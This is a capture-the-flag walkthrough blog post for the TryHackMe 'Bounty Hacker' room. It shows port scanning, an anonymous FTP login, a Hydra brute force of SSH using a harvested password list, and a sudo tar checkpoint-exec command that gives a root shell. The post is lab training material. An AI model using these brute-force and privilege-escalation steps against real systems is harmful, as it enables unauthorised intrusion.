---
layout: post
title: "Bounty Hacker"
date: 2022-03-21
categories: [Tryhackme, Easy-THM]
tags: [Linux, tar, privesc, ftp, brute-force, security]
image: ../../assets/img/posts/AgentSudo/BountyHacker.png 

---

## Description

You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker! 

|**Room**|[Bounty Hacker](https://tryhackme.com/room/cowboyhacker)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[Sevuhl](https://tryhackme.com/p/Sevuhl)|

---

Let's start with rustscan to quickly finds all open ports,

```bash
rustscan -a 10.10.229.96
```

![image](https://user-images.githubusercontent.com/67465230/159214665-39c43705-3f50-4cba-b828-f81f893993b4.png)

we got 3 open ports. Let's run a detail nmap scan on these ports to enumerate details.

```bash
nmap -sV -sC -p21,22,80 10.10.229.96 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/159214676-8fb39588-d40f-4b6a-aeba-093a2f36530f.png)

With nmap scan, we got to know that port 21 is running ftp service with anonymous login, port 22 is running ssh service and port 80 is running webserver. We'll first enumerate ftp service and then move towards webserver (port 80).

```bash
ftp 10.10.229.96
```

![image](https://user-images.githubusercontent.com/67465230/159214686-c5603821-9d12-458f-8000-6c7b82412957.png)

after providing credentials, **Anonymous:Anonymous**, we got logged in.

Let's establish directory content using `ls -la`,

![image](https://user-images.githubusercontent.com/67465230/159214704-0974210e-2f20-4f67-aa49-74cd887bff45.png)

we got 2 files named locks.txt and task.txt. Let's download them on our local system using `get` command,

```bash
get locks.txt
get tasks.txt
```

![image](https://user-images.githubusercontent.com/67465230/159214720-4774e0ff-85da-4ec6-9292-b23bc8e6638e.png)

With this, we've downloaded both files on our system. It's time to read the content of these files.

```bash
cat tasks.txt
```

![image](https://user-images.githubusercontent.com/67465230/159214730-36487de5-1c3c-45bc-b253-c2bbac9e623b.png)

After reading content of tasks.txt file, we got to know that Lin is author of the file or maybe a user? Let's see.

Let's read the locks.txt file content,

```bash
cat locks.txt
```

![image](https://user-images.githubusercontent.com/67465230/159214738-7ce1c3d3-9f1a-4799-b6af-f0baa966279e.png)

Seems like these are all passwords. Worth giving a shot to bruteforce to find out correct credential.

Now that we've enumerated ftp, let's enumerate webserver by visiting http://10.10.229.96,

![image](https://user-images.githubusercontent.com/67465230/159214750-7872f1e5-d6bd-4b29-8414-c9303a0634b1.png)

we got a webpage and it seems like these characters are trying to break into system. But since, we don't know the credential to login via ssh, we can't move forward. So let's create a user list which contains name of users,

```bash
cat user.txt
```

![image](https://user-images.githubusercontent.com/67465230/159214759-e5ff2534-10e4-494e-857e-8ce8ba3df213.png)

Reading the content of the file will confirm that we've added all the users.

Now that we've users list and password list, let's try to bruteforce credentials of ssh service with help of tool Hydra,

```bash
hydra -L user.txt -P locks.txt ssh://10.10.229.96:22/ -t 4
```

![image](https://user-images.githubusercontent.com/67465230/159214768-43d762fd-cbed-439b-be34-d415f319cca1.png)

after sometime, we'll get correct username and password. Let's now try to login via ssh service,

```bash
ssh lin@10.10.229.96
```

![image](https://user-images.githubusercontent.com/67465230/159214774-8df3f685-d7eb-4f93-b6c3-b1d60a845df0.png)

we've successfully authenticate ourselves as lin user.

Let's establish directory content using `ls -la`,

![image](https://user-images.githubusercontent.com/67465230/159214789-a0c6713e-e0fd-4a09-9c14-99ca9a9c00f7.png)

we got our user flag.

Now, the part remains is privilege escalation. Let's now list all the binaries which can be run as sudo without providing root user's password, 

```bash
sudo -l
```

![image](https://user-images.githubusercontent.com/67465230/159214802-c5b0f1f1-d565-43b5-bae9-e0beb88ee309.png)

we can see that /bin/tar binary can be run as sudo without providing password. Let's search if this binary privesc is on [GTFObins](https://gtfobins.github.io).

And we found a method to elevate our privileges using this binary,

![image](https://user-images.githubusercontent.com/67465230/159214813-c58cb969-b205-43db-8627-02064439687e.png)

we just have to execute this command and we're root. 

```bash
sudo tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

![image](https://user-images.githubusercontent.com/67465230/159214833-bcff2850-026b-437a-9e63-f870c679f3a8.png)

after executing this command, we'll become root user and we can confirm it with `id` command.

let's navigate to /root directory and establish directory content using `ls -la`

![image](https://user-images.githubusercontent.com/67465230/159214845-134eda90-eb64-434d-96c0-8f9f09956973.png)

and there we have it, our root flag.